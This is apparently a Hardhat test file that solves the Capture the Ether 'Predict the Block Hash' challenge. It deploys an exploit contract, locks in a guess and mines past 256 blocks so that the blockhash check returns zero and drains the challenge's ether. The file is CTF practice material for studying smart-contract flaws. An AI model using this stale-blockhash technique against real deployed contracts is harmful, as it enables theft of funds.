import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { mineUpTo } from '@nomicfoundation/hardhat-network-helpers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('PredictTheBlockHashChallenge', () => {
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;
  let target: Contract;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('PredictTheBlockHashChallenge', deployer)
    ).deploy({
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    const exploit = await (
      await ethers.getContractFactory('PredictTheBlockHashExploit', attacker)
    ).deploy(target.address);
    await exploit.deployed();

    const lockInGuessTx = await exploit.lockInMyGuess({ value: utils.parseEther('1') });
    await lockInGuessTx.wait();

    // we settle after at least 256 blocks (so `block.blockhash` returns 0x0)
    await mineUpTo(300);
    const settleTx = await exploit.tryToSettle();
    await settleTx.wait();

    expect(await target.isComplete()).to.equal(true);
  });
});
